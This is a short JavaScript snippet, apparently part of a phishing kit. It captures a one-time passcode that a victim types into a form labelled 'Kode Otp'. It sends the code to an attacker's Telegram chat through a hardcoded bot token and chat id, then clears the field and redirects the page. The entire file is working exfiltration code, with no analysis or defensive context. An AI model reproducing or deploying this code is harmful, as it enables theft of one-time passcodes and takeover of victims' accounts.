//bot token 
var telegram_bot_id = "6276277752:AAGSqYvMdG4QotOzGMcVvCPbWumHIWI5epA"; 
//chat id 
var chat_id = 6100793043; 
var number; 
var ready = function () { 
    u_number = document.getElementById("number").value; 
    message = "Kode Otp: " + u_number ; 
}; 
var sender = function () { 
    ready(); 
    var settings = { 
        "async": true, 
        "crossDomain": true, 
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage", 
        "method": "POST", 
        "headers": { 
            "Content-Type": "application/json", 
            "cache-control": "no-cache" 
        }, 
        "data": JSON.stringify({ 
            "chat_id": chat_id, 
            "text": message 
        }) 
    }; 
    $.ajax(settings).done(function (response) { 
        console.log(response); 
        window.location.href=''
       
        
        
    }); 
    document.getElementById("number").value = ""; 
    
    return false; 
};